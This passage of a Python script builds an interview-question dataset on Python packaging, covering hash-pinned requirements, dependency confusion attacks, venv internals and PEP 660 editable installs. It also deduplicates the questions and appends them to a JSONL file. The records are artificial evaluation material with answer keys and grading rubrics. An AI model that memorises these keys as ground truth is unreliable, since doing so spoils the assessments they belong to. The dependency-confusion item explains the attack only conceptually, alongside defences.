        "1) The Version Pinning Illusion: Specifying `requests==2.31.0` guarantees that pip requests that specific version string. However, PyPI packages can be published as multiple artifacts (wheels for different platforms, source distributions). Furthermore, if an attacker compromises an internal private package index mirror or executes an upstream PyPI account takeover, they can re-upload or substitute a malicious artifact bearing the exact same version string `2.31.0`. The version number matches, but the binary is compromised. 2) Cryptographic Hash Verification (`--require-hashes`): With `--require-hashes`, every line in `requirements.txt` must include one or more cryptographic SHA-256 hashes of the exact distribution archives: `requests==2.31.0 --hash=sha256:942c5a58... --hash=sha256:98d6b...`. 3) Enforcement: When pip downloads the wheel, it calculates the SHA-256 hash of the downloaded bytes. If the hash does not match, pip immediately aborts the installation, deletes the cached file, and exits with a critical security error, mathematically guaranteeing that the installed artifact matches the exact audited code.",
        [
            "Explains that version numbers alone do not prevent malicious package substitution or mirror compromise",
            "Defines --require-hashes as pinning the exact cryptographic SHA-256 checksum of distribution archives",
            "Highlights that pip calculates archive checksums upon download and aborts installation if hashes diverge"
        ],
        [
            "Claims hash verification converts Python code into cryptocurrency tokens"
        ]
    ),
    (
        "B69_4_18",
        "diagnose",
        "hard",
        "debugging",
        ["Security", "Packaging"],
        "Dependency Confusion / pip",
        "Dependency Confusion Attacks and Index Ordering in Enterprise Environments",
        "An enterprise company maintains an internal private Python package named `corp-auth` hosted on a private Nexus/Artifactory index. In `pip.conf`, they configure `extra-index-url = https://pypi.org/simple`. An external security researcher discovers the internal package name, registers `corp-auth` on the public PyPI repository with version `99.0.0`. On the next build, company servers install the researcher's public package instead of the internal one. Why did this Dependency Confusion attack succeed, and how do you configure pip securely?",
        "Mechanism of Dependency Confusion: 1) The Flaw of `extra-index-url`: When pip is configured with both a primary index (`index-url`) and an auxiliary index (`extra-index-url`), pip does NOT prioritize the private index! Instead, pip queries *both indexes simultaneously* for the package name, collects all available versions across both repositories, and installs the package with the *highest version number*. 2) The Attack Vector: The attacker uploads a rogue package named `corp-auth` to public PyPI with version `99.0.0` (higher than the company's internal `1.2.0`). When pip resolves `corp-auth`, it selects the attacker's `99.0.0` from public PyPI and executes it. Secure Remediation: 1) Never use `extra-index-url` for private packages. 2) Private Proxy / Pull-Through Cache: Configure `index-url` to point EXCLUSIVELY to the internal repository (Nexus/Artifactory). Configure Nexus as a secure caching proxy for PyPI. 3) Scoped Routing: Configure Nexus routing rules to block public PyPI requests for all internal package namespaces (`corp-*`). 4) Package Name Squatting Defense: Register dummy placeholder packages on public PyPI for all internal package names to prevent external registration.",
        [
            "Explains that extra-index-url causes pip to search both indexes and pick the highest version number regardless of source",
            "Identifies the attacker uploading high version numbers (99.0.0) to public PyPI to hijack internal package resolution",
            "Prescribes using a single index-url pointing to a private proxy (Nexus/Artifactory) with scoped repository routing rules"
        ],
        [
            "Claims Dependency Confusion is caused by developers forgetting how to spell their company's name"
        ]
    ),
    (
        "B69_4_19",
        "explain",
        "medium",
        "explain",
        ["Packaging", "Operating Systems"],
        "virtualenv / pyvenv.cfg",
        "Virtual Environment Internals: pyvenv.cfg and sys.prefix Redirection",
        "When you create a Python virtual environment (`python -m venv myenv`), the created directory consumes only a few megabytes and does not copy the entire Python standard library or C runtime. How does CPython detect that it is executing inside a virtual environment using `pyvenv.cfg`, and how does it redirect `sys.prefix` and `sys.path`?",
        "CPython Virtual Environment Discovery Mechanics: 1) The `pyvenv.cfg` File: When `venv` creates an environment, it places a text file named `pyvenv.cfg` in the virtual environment root (or one directory up from the binary). It contains metadata: `home = /usr/bin`, `include-system-site-packages = false`, `version = 3.11.5`. 2) Binary Symlinks: The `bin/python` inside the virtual environment is merely a symlink to the host's base Python executable (`/usr/bin/python3`). 3) Startup Detection Sequence: When CPython boots: A) It checks the directory containing the executable and its parent directories for the presence of `pyvenv.cfg`. B) If found, CPython sets `sys.prefix` and `sys.exec_prefix` to the path of the virtual environment (`/path/to/myenv`). C) It sets `sys.base_prefix` to the original installation directory specified in the `home` key of `pyvenv.cfg`. 4) `sys.path` Construction: CPython loads standard library modules directly from `sys.base_prefix` (avoiding copying the standard library), but points `site-packages` strictly to `sys.prefix/lib/pythonX.Y/site-packages`. Packages installed in the venv are completely isolated from the system Python.",
        [
            "Identifies pyvenv.cfg as the trigger file for CPython virtual environment initialization",
            "Explains that venv binaries are lightweight symlinks pointing to base_prefix executables",
            "Describes setting sys.prefix to the venv directory while reading base stdlib from sys.base_prefix"
        ],
        [
            "Claims virtual environments run inside Docker containers managed by the Linux kernel"
        ]
    ),
    (
        "B69_4_20",
        "explain",
        "medium",
        "explain",
        ["Packaging", "Development Workflow"],
        "PEP 660 / Editable Installs",
        "PEP 660 Editable Wheels vs Legacy setup.py develop Symlinks",
        "When developing a local Python package in a monorepo, developers run `pip install -e .` (editable install) so code changes take effect immediately without re-installing. How did PEP 660 modernize editable installs to replace legacy `setup.py develop` and `.egg-link` files with editable wheels and import hooks?",
        "1) Legacy Editable Installs (`setup.py develop`): In legacy packaging, `pip install -e .` invoked `setup.py develop`. Setuptools generated an `.egg-link` file in `site-packages` containing the raw filesystem path, and prepended the directory to `easy-install.pth`. Limitations: It relied on deprecated Setuptools-specific internals, bypassed modern build backends (Flit, Hatch, Poetry), and failed to build native C extensions properly. 2) PEP 660 Editable Wheels: PEP 660 standardized editable installs across all build backends: A) The build backend implements `build_editable()`, generating an actual `.whl` package tagged as editable. B) Modern `.pth` Files: The wheel installs a `.pth` file into `site-packages` that simply contains the directory path of your source code. On Python startup, site-packages processor automatically appends lines in `.pth` files to `sys.path`. C) Loader Hooks: For complex package layouts, backends generate an import hook / finder module that intercepts `import mypackage` and resolves it dynamically to the live source tree, ensuring real-time code updates while strictly conforming to standard wheel installation mechanics.",
        [
            "Contrasts legacy Setuptools-specific .egg-link files with standardized PEP 660 editable wheels",
            "Explains build_editable() hook generating standard wheels that inject .pth path files into site-packages",
            "Highlights support for modern packaging backends (Flit, Hatch, Poetry) without requiring setup.py"
        ],
        [
            "Claims editable installs recompile the entire Linux kernel on every keystroke"
        ]
    )
]

def run_batch():
    with open(OUT, "r", encoding="utf-8") as f:
        existing = [json.loads(line) for line in f if line.strip()]

    print(f"Loaded {len(existing)} existing records.")
    
    for q in Q:
        if LEAK.search(q[7]) or LEAK.search(q[8]):
            print(f"PROMPT LEAK DETECTED in: {q[7]}")
            sys.exit(1)
            
    existing_texts = [ex["question"] for ex in existing]
    new_texts = [q[7] for q in Q]
    
    vec = TfidfVectorizer(stop_words="english", ngram_range=(1,2))
    all_texts = existing_texts + new_texts
    vec.fit(all_texts)
    
    existing_vecs = vec.transform(existing_texts)
    new_vecs = vec.transform(new_texts)
    
    sim_matrix = cosine_similarity(new_vecs, existing_vecs)
    
    accepted = []
    rejected = []
    
    for i, q in enumerate(Q):
        max_sim = float(sim_matrix[i].max()) if sim_matrix.shape[1] > 0 else 0
        if max_sim > 0.85:
            print(f"REJECTED (Sim: {max_sim:.2f}): {q[7][:50]}...")
            rejected.append(q)
        else:
            print(f"ACCEPTED (Sim: {max_sim:.2f}): {q[7][:60]}...")
            accepted.append(q)
            
    print(f"Accepted {len(accepted)} / {len(Q)} questions (Part 4).")
    if len(rejected) > 0:
        print("Stopping due to rejections.")
        sys.exit(1)
        
    new_records = []
    for q in accepted:
        rec = {
            "primary_role": ROLE,
            "role": ROLE,
            "applicable_roles": ["Backend Developer", "Software Engineer"],
            "primary_skill": q[4][0],
            "skill": q[4][0],
            "secondary_skills": q[4][1:] if len(q[4]) > 1 else [],
            "technology": q[5],
            "topic": q[6],
            "category": "Software Engineering",
            "intent": q[1],
            "difficulty": q[2],
            "question_type": q[3],
            "question": q[7],
            "ideal_answer": q[8],
            "expected_answer": q[8],
            "evaluation_rubric": {
                "strong_indicators": q[9],
                "weak_indicators": q[10]
            },
            "id": str(uuid.uuid4()),
            "source": "Antigravity_Internal_Knowledge",
            "provenance_type": "researched_generated",
            "dataset_version": "v2",
            "status": "active"
        }
        new_records.append(rec)
        
    with open(OUT, "a", encoding="utf-8") as f:
        for r in new_records:
            f.write(json.dumps(r) + "\n")
            
    with open(OUT, "r", encoding="utf-8") as f:
        final_existing = [json.loads(line) for line in f if line.strip()]
        
    role_counts = Counter(r.get("primary_role") or r.get("role") for r in final_existing)
    
    print("\n========================================")
    print("POST-BATCH AUDIT PART 4")
    print("========================================")
    print(f"Batch: 69 Part 4")
    print(f"Target role: {ROLE}")
    print(f"Attempted: {len(Q)}")
    print(f"Accepted: {len(accepted)}")
    print(f"Rejected: {len(rejected)}")
    print(f"Cumulative total: {len(final_existing)}")
    print(f"{ROLE} total: {role_counts[ROLE]}")

if __name__ == "__main__":
    run_batch()
